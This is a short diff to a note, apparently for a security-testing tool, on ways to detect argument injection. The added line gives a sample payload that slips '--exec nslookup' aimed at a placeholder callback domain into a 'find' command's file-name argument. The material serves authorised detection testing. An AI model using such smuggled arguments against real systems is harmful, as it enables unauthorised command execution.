@@ -1,7 +1,7 @@
 # Detecting argument injection
 Apart from differences in application's response, we might dalso detect argument injection by:
 - reference injection- we supply an argument that, if interpreted properly, will ensue a network response (e.g. a DNS lookup, HTTP/FTP/SMB interaction etc) - this can be bruteforced
-- command injection through the target-specific argument - we supply an arbitrary command into a command-specific flag - which is our "base" command in SHELLING (doing whatever the setting is, e.g. a lookup or sleep/selfping)  - this is rather hardcoded, e.g. 
+- command injection through the target-specific argument - we supply an arbitrary command into a command-specific flag - which is our "base" command in SHELLING (doing whatever the setting is, e.g. a lookup or sleep/selfping)  - this is rather hardcoded, e.g. "find / -name <INJECTION>" with injection "a --exec nslookup PAYLOAD_MARK.BURP_COLLAB_DOMAIN".
 
 
 
